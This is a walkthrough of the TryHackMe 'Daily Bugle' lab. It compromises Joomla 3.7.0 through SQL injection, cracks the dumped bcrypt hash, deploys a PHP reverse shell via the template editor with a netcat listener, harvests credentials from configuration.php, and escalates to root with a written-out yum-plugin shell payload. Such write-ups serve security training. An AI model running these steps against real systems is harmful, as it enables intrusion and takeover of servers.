# [Daily Bugle](https://tryhackme.com/room/dailybugle)

## Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum

# Deploy

### Access the web server, who robbed the bank?

1. Enumerate all services running on the target machine with `nmap`

![SCREEN01](https://github.com/user-attachments/assets/0f367f97-c5e1-4f9b-b784-09dea498db3d)

2. Go to the `http://IP/`, the headline article states that **spiderman** robbed the bank

![SCREEN02](https://github.com/user-attachments/assets/1f22d8cb-5efe-47b1-abd9-6e8b63c86ee0)

---

### Obtain user and root

## Hack into the machine and obtain the root user's credentials

### What is the Joomla version?

_Hint: I wonder if this version of Joomla is vulnerable..._

1. Use `joomscan` to identify the exact Joomla version:
   - The version is **3.7.0**

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan
chmod +x joomscan.pl
perl joomscan.pl --url http://IP
```

![SCREEN03](https://github.com/user-attachments/assets/60d0324c-5725-4ffc-b602-62e460c9c3bf)

---

### What is Jonah's cracked password?

_Hint: SQLi & JohnTheRipper_

1. Use the [Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla) python script

```bash
python3 joomblah.py http://IP/
```

![SCREEN04](https://github.com/user-attachments/assets/2be7bfda-e461-4c8e-b351-0382301eba6f)

2. Copy the password hash, and crack it with John the Ripper
   - The password is **spiderman123**

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah_hash.txt
john --format=bcrypt --wordlist=/root/Tools/wordlists/rockyou.txt jonah_hash.txt
```

![SCREEN05](https://github.com/user-attachments/assets/7f768e70-f9f5-438c-9a68-8d6741014547)

---

### What is the user flag?

1. Perform directory enumeration to identify the admin login page

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

![SCREEN06](https://github.com/user-attachments/assets/589c0875-eaff-4a3d-8502-a7442b63bbf8)

2. Log in to the Joomla administrator panel at `http://IP/administrator/index.php` with `jonah:spiderman123`

3. Paste [PHP Reverse Shell payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) in template. For example: `http://10.10.48.111/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

4. Deploy a [PHP reverse shell](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) through the template editor at `http://IP/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

5. Set up a netcat listener on your attacking machine and trigger the reverse shell by visiting the modified template page in the browser

```bash
nc -lvnp 4444
```

![SCREEN07](https://github.com/user-attachments/assets/ee0eeda4-1056-406f-ad8a-bc93ab58696b)

5. From the initial shell, examine the website configuration to find credentials

```bash
cd /var/www/html
cat configuration.php
```

![SCREEN08](https://github.com/user-attachments/assets/6c15cc2b-5c3f-437a-84ff-460c60a48ded)

6. Use the discovered password to switch to the `jjameson` user

```bash
su jjameson

# Upgrade shell to interactive PTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

![SCREEN09](https://github.com/user-attachments/assets/dbfe8e90-debf-4297-b9ac-6413fef346f2)

7. Retrieve the user flag

```bash
cat /home/jjameson/user.txt
```

![SCREEN10](https://github.com/user-attachments/assets/165ae883-e7f1-4b22-a0cc-dcfa842490a1)

---

### What is the root flag?

1. Check for privilege escalation vectors

```bash
sudo -l
```

![SCREEN11](https://github.com/user-attachments/assets/e41b4c8d-5e61-4674-b20c-6dfc87f93bea)

2. Exploit the `yum` plugin functionality to gain root access using a method from [GTFOBins](https://gtfobins.github.io/gtfobins/yum/)

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

whoami
```

![SCREEN12](https://github.com/user-attachments/assets/f21ac23e-00ef-4183-a532-7121cc17cabf)

3. Retrieve the root flag

```bash
cat /root/root.txt
```

![SCREEN13](https://github.com/user-attachments/assets/420cc685-e8ea-4178-b96e-694e367cce59)
